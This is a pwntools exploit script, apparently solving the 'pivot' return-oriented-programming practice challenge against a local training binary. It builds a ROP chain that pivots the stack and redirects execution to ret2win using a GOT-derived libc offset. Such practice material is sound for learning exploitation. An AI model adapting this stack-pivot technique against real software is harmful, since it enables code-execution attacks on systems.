from pwn import *
# context.log_level = "debug"
p = process("./pivot")
elf = ELF("./pivot")
libc = ELF("./libpivot.so")

# gdb.attach(p , "b *0x400ADA")
# raw_input()
p.recvuntil("place to pivot: 0x")
second_addr = int(p.recvuntil("\n")[:-1] , 16)
leave_ret = 0x400a39
foothold_function_got = elf.got["foothold_function"]
foothold_function_plt = elf.plt["foothold_function"]
p_rax_r = 0x400B00
xchg_r = 0x400B02
mov_rax_rax = 0x400B05
add_rax_rsp = 0x400B09
add_rax_rbp = 0x400b09
pop_rbp_ret = 0x400900
call_rax = 0x40098e 
offset = libc.sym["ret2win"] - libc.sym["foothold_function"] 
p.recvuntil("> ")
# payload2 =  "a" * 8 + p64(foothold_function_plt)
payload2 = p64(foothold_function_plt)
payload2 += p64(p_rax_r) + p64(foothold_function_got) 
payload2 += p64(mov_rax_rax)
payload2 += p64(pop_rbp_ret) + p64(offset)
payload2 += p64(add_rax_rbp)

payload2 += p64(call_rax)
p.sendline(payload2)


p.recvuntil("> ")

payload = "a" * 0x20 + p64(second_addr + 8) + p64(p_rax_r) + p64(second_addr) + p64(xchg_r)
p.sendline(payload)
p.recvuntil("libpivot.so")
print(p.recv())